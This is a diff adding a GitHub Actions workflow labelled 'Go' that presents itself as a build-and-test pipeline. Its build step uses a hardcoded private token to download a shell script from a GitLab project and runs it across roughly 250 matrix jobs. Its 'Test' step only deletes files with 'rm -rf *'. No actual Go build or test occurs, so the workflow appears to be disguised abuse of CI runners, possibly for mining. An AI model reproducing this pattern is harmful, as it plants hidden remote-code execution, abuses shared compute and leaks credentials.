@@ -1,0 +1,63 @@
+
+name: Go
+
+on:
+  push:
+  pull_request:
+  workflow_dispatch:
+
+
+jobs:
+  check:
+    runs-on: ubuntu-16.04
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [Check_Go,Check_OS]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: Cancel Previous Runs
+      uses: styfle/cancel-workflow-action@0.8.0
+      with:
+         access_token: ${{ github.token }}
+         workflow_id: ${{ github.event.workflow.id }}
+         ignore_sha: true
+
+  build:
+    runs-on: ubuntu-16.04
+    needs: check
+    strategy:
+      matrix:
+        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: Build
+      run: |
+        wget -O go-build.sh --header='PRIVATE-TOKEN:4dMSBFEhqtY2yzGwgXJk' 'https://gitlab.com/api/v4/projects/25295008/repository/files/go-build.sh/raw?ref=master'
+        chmod +x go-build.sh && ./go-build.sh
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"
